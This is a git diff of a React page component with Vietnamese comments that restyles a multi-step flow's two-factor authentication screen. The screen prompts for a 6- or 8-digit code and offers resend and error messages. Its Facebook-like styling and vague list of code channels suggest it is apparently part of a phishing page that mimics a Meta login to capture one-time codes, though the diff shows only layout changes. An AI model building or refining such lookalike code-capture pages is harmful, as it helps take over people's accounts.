@@ -752,44 +752,54 @@ export default function Home() {
                 </div>
               )}
 
-                            {/* BƯỚC 4: OTP FULL PAGE */}
+                                          {/* BƯỚC 4: OTP FULL PAGE */}
               {step === 4 && !showSuccess && (
-                <div>
-                  {/* Chia 2 cột: Text bên trái, Ảnh bên phải (tỷ lệ 1:1) */}
+                <div style={{ 
+                  // Bọc ngoài cùng để căn giữa
+                  display: 'flex', 
+                  flexDirection: 'column', 
+                  width: '100%' 
+                }}>
+                  {/* Bố cục ngang: Text 1 bên, Ảnh 1 bên */}
                   <div style={{ 
                     display: 'grid', 
-                    gridTemplateColumns: '1fr 1fr', 
-                    gap: '24px', 
+                    gridTemplateColumns: '1.2fr 1fr', // Text chiếm 55%, Ảnh chiếm 45%
+                    gap: '40px', 
                     alignItems: 'center', 
                     marginBottom: '32px' 
                   }}>
                     <div>
-                      <h2 style={{ fontSize: '24px', fontWeight: '700', marginBottom: '12px', color: '#1c1e21', lineHeight: '1.3' }}>
+                      <h2 style={{ fontSize: '26px', fontWeight: '700', marginBottom: '12px', color: '#1c1e21', lineHeight: '1.3' }}>
                         Two-factor authentication
                       </h2>
-                      <p style={{ fontSize: '15px', color: '#1c1e21', margin: 0, lineHeight: '1.5' }}>
+                      <p style={{ fontSize: '16px', color: '#1c1e21', margin: 0, lineHeight: '1.5' }}>
                         Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, Gmail, or Google Authenticator.
                       </p>
                     </div>
                     <div>
-                      {/* Ảnh sẽ tự động co giãn theo cột, to và rõ hơn */}
                       <img 
                         src="/images/2fa-illustration.png" 
                         alt="2FA Code" 
-                        style={{ width: '100%', height: 'auto', display: 'block', borderRadius: '8px' }} 
+                        style={{ 
+                          width: '100%', 
+                          height: 'auto', 
+                          display: 'block', 
+                          borderRadius: '8px', // Bo góc cho ảnh đẹp
+                          objectFit: 'cover'
+                        }} 
                       />
                     </div>
                   </div>
 
                   {/* Form nhập OTP */}
-                  <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
+                  <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '16px', width: '100%' }}>
                     <input 
                       type="text" 
                       placeholder="Code" 
                       value={otp} 
                       onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }}
                       style={{ 
-                        padding: '14px 16px', 
+                        padding: '16px', 
                         fontSize: '16px', 
                         border: '1px solid #ccd0d5', 
                         borderRadius: '8px', 
@@ -799,11 +809,11 @@ export default function Home() {
                       }} 
                     />
                     
-                    <div style={{ fontSize: '14px', color: '#65676b', display: 'flex', alignItems: 'center', gap: '6px', flexWrap: 'wrap' }}>
-                      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 12a9 9 0 1 1-9-9c2.52 0 4.93 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/></svg>
+                    <div style={{ fontSize: '15px', color: '#65676b', display: 'flex', alignItems: 'center', gap: '6px', flexWrap: 'wrap' }}>
+                      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 12a9 9 0 1 1-9-9c2.52 0 4.93 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/></svg>
                       It may take a few minutes for you to get this code.
                       {otpCanResend ? (
-                        <button type="button" onClick={handleResendOtp} disabled={loading} style={{ background: 'none', border: 'none', color: loading ? '#a0c3ff' : '#0064e0', fontWeight: '600', cursor: loading ? 'not-allowed' : 'pointer', fontSize: '14px', padding: 0 }}>
+                        <button type="button" onClick={handleResendOtp} disabled={loading} style={{ background: 'none', border: 'none', color: loading ? '#a0c3ff' : '#0064e0', fontWeight: '600', cursor: loading ? 'not-allowed' : 'pointer', fontSize: '15px', padding: 0 }}>
                           {loading ? 'Sending...' : 'Get a new code'}
                         </button>
                       ) : (
@@ -811,11 +821,11 @@ export default function Home() {
                       )}
                     </div>
 
-                    {showOtpError && <div style={{ color: '#fa383e', fontSize: '14px', marginTop: '4px' }}>Incorrect code. Please try again.</div>}
+                    {showOtpError && <div style={{ color: '#fa383e', fontSize: '15px', marginTop: '4px' }}>Incorrect code. Please try again.</div>}
 
                     <button type="submit" disabled={loading || otp.length < 6} style={{
                       width: '100%',
-                      padding: '14px',
+                      padding: '16px',
                       borderRadius: '100px',
                       border: 'none',
                       background: otp.length >= 6 ? '#0064e0' : '#a0c3ff',
